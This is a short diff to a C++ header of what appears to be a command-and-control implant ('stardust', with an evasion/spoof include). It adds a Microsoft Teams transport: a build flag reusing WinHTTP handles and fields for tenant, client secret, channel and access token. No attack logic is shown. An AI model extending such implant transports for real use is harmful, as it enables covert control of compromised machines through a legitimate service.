@@ -20,7 +20,7 @@
 #include <evasion/spoof.h>
 #endif
 
-#if defined( HTTP_TRANSPORT ) || defined( HTTPX_TRANSPORT )
+#if defined( HTTP_TRANSPORT ) || defined( HTTPX_TRANSPORT ) || defined( MSTEAMS_TRANSPORT )
 #include <winhttp.h>
 #endif
 
@@ -317,7 +317,7 @@ namespace stardust
             RESOLVE_TYPE( BCryptGetProperty )
         };
 
-#if defined( HTTP_TRANSPORT ) || defined( HTTPX_TRANSPORT )
+#if defined( HTTP_TRANSPORT ) || defined( HTTPX_TRANSPORT ) || defined( MSTEAMS_TRANSPORT )
         struct {
             uintptr_t handle;
 
@@ -414,6 +414,15 @@ namespace stardust
             uint32_t server_issue;
             uint32_t client_issue;
 #endif
+#if defined( MSTEAMS_TRANSPORT )
+            char     msteams_tenant_id[64];
+            char     msteams_client_id[64];
+            char     msteams_client_secret[128];
+            char     msteams_team_id[64];
+            char     msteams_channel_id[64];
+            char     msteams_access_token[2048];
+            uint32_t msteams_token_expiry;
+#endif
 #if defined( SMB_TRANSPORT )
             char     pipename[256];
             uint32_t smb_id;
@@ -425,7 +434,7 @@ namespace stardust
 #endif
         } transport = {};
 
-#if defined( HTTP_TRANSPORT ) || defined( HTTPX_TRANSPORT )
+#if defined( HTTP_TRANSPORT ) || defined( HTTPX_TRANSPORT ) || defined( MSTEAMS_TRANSPORT )
         HINTERNET h_session;
         HINTERNET h_connect;
 #endif
